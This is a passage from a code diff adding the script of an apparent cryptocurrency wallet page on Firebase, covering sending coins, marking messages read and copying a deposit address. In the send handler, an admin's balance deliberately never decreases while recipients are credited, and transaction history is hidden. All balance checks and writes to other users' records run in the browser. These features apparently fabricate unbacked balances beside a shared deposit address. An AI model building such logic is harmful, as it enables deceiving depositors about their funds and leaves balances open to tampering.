+  if(!resolvedRecipient){toast("Invalid recipient","err");return;}
+  const amt=parseFloat(document.getElementById("send-amount").value);
+  const coin=document.getElementById("send-coin").value;
+  const note=document.getElementById("send-note").value;
+  if(!amt||isNaN(amt)||amt<=0){toast("Enter a valid amount","err");return;}
+  if(!isAdmin()&&getBal(coin)<amt){toast(`Insufficient ${coin}`,"err");return;}
+  try{
+    // Admin: NEVER touch their balance in Firestore — funds never decrease
+    if(!isAdmin()){
+      const nb={...userData.balances,[coin]:userData.balances[coin]-amt};
+      await updateDoc(doc(db,"users",auth.currentUser.uid),{balances:nb});
+      userData.balances=nb;
+    }
+    // Credit recipient
+    const rSnap=await getDocs(query(collection(db,"users"),where("email","==",resolvedRecipient.email)));
+    if(!rSnap.empty){
+      const rDoc=rSnap.docs[0];const rData=rDoc.data();
+      await updateDoc(doc(db,"users",rDoc.id),{balances:{...(rData.balances||{}),[coin]:(rData.balances?.[coin]||0)+amt}});
+    }
+    // Record tx (inbox only — no history shown)
+    await addDoc(collection(db,"transactions"),{
+      from:currentUser.email,fromName:userData?.name||currentUser.displayName||currentUser.email,
+      to:resolvedRecipient.email,toName:resolvedRecipient.name,
+      coin,amount:amt,usd:amt*(P[coin]||1),note,time:Date.now(),read:false,
+      participants:[currentUser.email,resolvedRecipient.email]
+    });
+    const rName=resolvedRecipient.name;
+    document.getElementById("send-email").value="";document.getElementById("send-amount").value="";
+    document.getElementById("send-note").value="";document.getElementById("send-recipient-box").style.display="none";
+    document.getElementById("send-usd-est").style.display="none";resolvedRecipient=null;
+    toast(`Sent ${cf(amt,coin)} to ${rName}`);renderSend();
+  }catch(e){toast("Transfer failed","err");console.error(e);}
+};
+
+window.markRead=async function(id){await updateDoc(doc(db,"transactions",id),{read:true});};
+
+window.copyAddress=function(){
+  navigator.clipboard.writeText(DEPOSIT_ADDRESS).then(()=>{
+    const btn=document.getElementById("copy-btn");
+    btn.classList.add("done");
+    btn.innerHTML=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> Copied!`;
+    setTimeout(()=>{btn.classList.remove("done");btn.innerHTML=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copy Address`;},2000);
+  });
+};
+</script>
+</body>
+</html>
